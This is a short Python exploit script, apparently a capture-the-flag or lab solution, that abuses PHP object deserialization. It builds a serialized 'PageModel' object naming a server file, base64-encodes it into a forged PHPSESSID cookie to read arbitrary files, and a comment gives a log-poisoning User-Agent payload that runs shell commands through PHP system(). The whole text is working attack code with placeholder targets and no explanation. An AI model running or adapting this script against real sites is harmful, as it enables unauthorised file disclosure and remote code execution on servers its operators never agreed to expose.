import requests
import base64

s = requests.session()  # use with session for cookie management

url = '__URL_HERE__'

file = '/file/on/server' # read file like /www/index.html | @String "file" variable only contains file name
data = 'O:9:"PageModel":1:{s:4:"file";s:' + \
    str(len(file)) + ':"' + file + '";}'  # Serialized data modification

print('data:' + data)  # check the data
encodedBytes = base64.b64encode(data.encode("utf-8"))  # encode to base64
encodedStr = str(encodedBytes, "utf-8")  # encode to utf-8 str

s.cookies.set('PHPSESSID',  encodedStr,
              domain='__domain_name__', path='/')  # Set our own modified cookie

# for poisoning send with headers={'User-Agent': "<?php system('ls /');?>"}
r = s.get(url)

print(r.text)  # read content
print(s.cookies)  # cookies check
